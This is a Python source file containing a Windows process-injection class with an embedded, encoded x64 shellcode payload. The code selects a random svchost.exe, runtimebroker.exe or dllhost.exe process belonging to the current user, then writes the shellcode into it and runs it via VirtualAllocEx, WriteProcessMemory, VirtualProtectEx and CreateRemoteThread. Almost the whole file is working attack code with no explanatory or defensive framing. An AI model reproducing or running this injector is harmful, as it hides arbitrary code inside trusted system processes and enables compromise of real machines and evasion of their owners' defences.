import ctypes
import ctypes.wintypes as wt
import random
import codecs
import os
import platform
import sys
import psutil64 as psutil


class InjectProcess():
    x64 = b""
    x64 += b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
    x64 += b"\xef\xff\xff\xff\x48\xbb\x91\xdb\x2e\x73\xe3\x6e\x12"
    x64 += b"\xbe\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    x64 += b"\x6d\x93\xad\x97\x13\x86\xd2\xbe\x91\xdb\x6f\x22\xa2"
    x64 += b"\x3e\x40\xef\xc7\x93\x1f\xa1\x86\x26\x99\xec\xf1\x93"
    x64 += b"\xa5\x21\xfb\x26\x99\xec\xb1\x93\xa5\x01\xb3\x26\x1d"
    x64 += b"\x09\xdb\x91\x63\x42\x2a\x26\x23\x7e\x3d\xe7\x4f\x0f"
    x64 += b"\xe1\x42\x32\xff\x50\x12\x23\x32\xe2\xaf\xf0\x53\xc3"
    x64 += b"\x9a\x7f\x3b\x68\x3c\x32\x35\xd3\xe7\x66\x72\x33\xe5"
    x64 += b"\x92\x36\x91\xdb\x2e\x3b\x66\xae\x66\xd9\xd9\xda\xfe"
    x64 += b"\x23\x68\x26\x0a\xfa\x1a\x9b\x0e\x3a\xe2\xbe\xf1\xe8"
    x64 += b"\xd9\x24\xe7\x32\x68\x5a\x9a\xf6\x90\x0d\x63\x42\x2a"
    x64 += b"\x26\x23\x7e\x3d\x9a\xef\xba\xee\x2f\x13\x7f\xa9\x3b"
    x64 += b"\x5b\x82\xaf\x6d\x5e\x9a\x99\x9e\x17\xa2\x96\xb6\x4a"
    x64 += b"\xfa\x1a\x9b\x0a\x3a\xe2\xbe\x74\xff\x1a\xd7\x66\x37"
    x64 += b"\x68\x2e\x0e\xf7\x90\x0b\x6f\xf8\xe7\xe6\x5a\xbf\x41"
    x64 += b"\x9a\x76\x32\xbb\x30\x4b\xe4\xd0\x83\x6f\x2a\xa2\x34"
    x64 += b"\x5a\x3d\x7d\xfb\x6f\x21\x1c\x8e\x4a\xff\xc8\x81\x66"
    x64 += b"\xf8\xf1\x87\x45\x41\x6e\x24\x73\x3b\x59\x6f\x12\xbe"
    x64 += b"\x91\xdb\x2e\x73\xe3\x26\x9f\x33\x90\xda\x2e\x73\xa2"
    x64 += b"\xd4\x23\x35\xfe\x5c\xd1\xa6\x58\x9e\xa7\x1c\xc7\x9a"
    x64 += b"\x94\xd5\x76\xd3\x8f\x41\x44\x93\xad\xb7\xcb\x52\x14"
    x64 += b"\xc2\x9b\x5b\xd5\x93\x96\x6b\xa9\xf9\x82\xa9\x41\x19"
    x64 += b"\xe3\x37\x53\x37\x4b\x24\xfb\x10\x82\x02\x71\x90\xf4"
    x64 += b"\xa3\x4b\x73\xe3\x6e\x12\xbe"

    PROCESS_SOME_ACCESS = 0x000028
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    MEM_COMMIT_RESERVE = 0x3000

    PAGE_READWRITE = 0x04
    PAGE_READWRITE_EXECUTE = 0x40
    PAGE_READ_EXECUTE = 0x20

    def __init__(self, shellcode=b''):
        self.kernel32 = ctypes.windll.kernel32
        self.kernel32_function_definitions()
        domain = os.getenv('USERDOMAIN')
        name = os.getenv('USERNAME')
        self.username = '{}\\{}'.format(domain, name).lower()
        if shellcode and platform.architecture()[0] == '64bit':
            self.shellcode = shellcode
        elif platform.architecture()[0] == '64bit':
            self.shellcode = self.x64
        else:
            self.shellcode = b''

    def kernel32_function_definitions(self):
        # Define argument types for Kernel32 functions

        # CloseHandle()
        self.CloseHandle = ctypes.windll.kernel32.CloseHandle
        self.CloseHandle.argtypes = [wt.HANDLE]
        self.CloseHandle.restype = wt.BOOL

        # CreateRemoteThread()
        self.CreateRemoteThread = ctypes.windll.kernel32.CreateRemoteThread
        self.CreateRemoteThread.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID
        ]
        self.CreateRemoteThread.restype = wt.HANDLE

        # OpenProcess()
        self.OpenProcess = ctypes.windll.kernel32.OpenProcess
        self.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
        self.OpenProcess.restype = wt.HANDLE

        # VirtualAllocEx()
        self.VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
        self.VirtualAllocEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.DWORD, wt.DWORD
        ]
        self.VirtualAllocEx.restype = wt.LPVOID

        # VirtualFreeEx()
        self.VirtualFreeEx = ctypes.windll.kernel32.VirtualFreeEx
        self.VirtualFreeEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.DWORD
        ]
        self.VirtualFreeEx.restype = wt.BOOL

        # VirtualProtectEx()
        self.VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
        self.VirtualProtectEx.argtypes = [
            wt.HANDLE, wt.LPVOID, ctypes.c_size_t,
            wt.DWORD, wt.LPVOID
        ]
        self.VirtualProtectEx.restype = wt.BOOL

        # WriteProcessMemory()
        self.WriteProcessMemory = self.kernel32.WriteProcessMemory
        self.WriteProcessMemory.argtypes = [
            wt.HANDLE, wt.LPVOID, wt.LPCVOID,
            ctypes.c_size_t, wt.LPVOID
        ]
        self.WriteProcessMemory.restype = wt.BOOL

    def select_pid(self):
        candidates = {}
        funprocs = ['svchost.exe', 'runtimebroker.exe', 'dllhost.exe']
        for pid in psutil.pids():
            p = psutil.Process(pid)
            try:
                name = p.name().lower()
                username = p.username().lower()
            except:
                continue
            if self.username == username and name in funprocs:
                candidates[pid] = name
        choice = random.choice(list(candidates.keys()))
        return int(choice)

    def Inject_RemoteThread(self):
        if not self.shellcode:
            return 'Invalid shellcode or x86 platform not supported'
        pid = self.select_pid()
        ph = self.kernel32.OpenProcess(self.PROCESS_SOME_ACCESS, False, pid)
        if ph == 0:
            return 'ERROR: OpenProcess(): {}'.format(
                self.kernel32.GetLastError()
            )

        memptr = self.VirtualAllocEx(
            ph, 0, len(self.shellcode),
            self.MEM_COMMIT_RESERVE,
            self.PAGE_READWRITE
        )
        if memptr == 0:
            return 'ERROR: VirtualAllocEx(): {}'.format(
                self.kernel32.GetLastError()
            )

        nbytes = ctypes.c_int(0)
        result = self.WriteProcessMemory(
            ph, memptr, self.shellcode,
            len(self.shellcode), ctypes.byref(nbytes)
        )
        if result == 0:
            return 'ERROR: WriteProcessMemory(): {}'.format(
                self.kernel32.GetLastError()
            )
        
        old_protection = ctypes.pointer(wt.DWORD())
        if b'\x00' in self.shellcode:
            new_protection = self.PAGE_READ_EXECUTE
        else:
            new_protection = self.PAGE_READWRITE_EXECUTE
        result = self.VirtualProtectEx(
            ph, memptr, len(self.shellcode),
            new_protection, old_protection
        )
        if result == 0:
            return 'ERROR: VirtualProtectEx(): {}'.format(
                self.kernel32.GetLastError()
            )
        th = self.CreateRemoteThread(ph, None, 0, memptr, None, 0, None)
        if not th:
            return 'ERROR: CreateRemoteThread(): {}'.format(
                self.kernel32.GetLastError()
            )

        self.VirtualFreeEx(ph, memptr, 0, 0xC000)
        self.CloseHandle(ph)
        return 'Injected shellcode of length {} bytes into PID {}'.format(len(self.shellcode), pid)
